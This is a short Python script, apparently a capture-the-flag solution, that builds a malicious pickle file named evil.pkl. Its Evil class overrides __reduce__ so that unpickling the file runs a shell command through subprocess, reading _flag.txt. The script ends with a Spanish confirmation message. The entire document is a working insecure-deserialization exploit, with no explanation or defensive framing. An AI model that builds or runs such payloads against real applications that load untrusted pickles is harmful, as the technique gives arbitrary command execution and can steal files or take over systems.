import pickle
import subprocess

class Evil:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "_flag.txt"],))

with open("evil.pkl", "wb") as f:
    pickle.dump(Evil(), f)

print("Nuevo evil.pkl generado.")
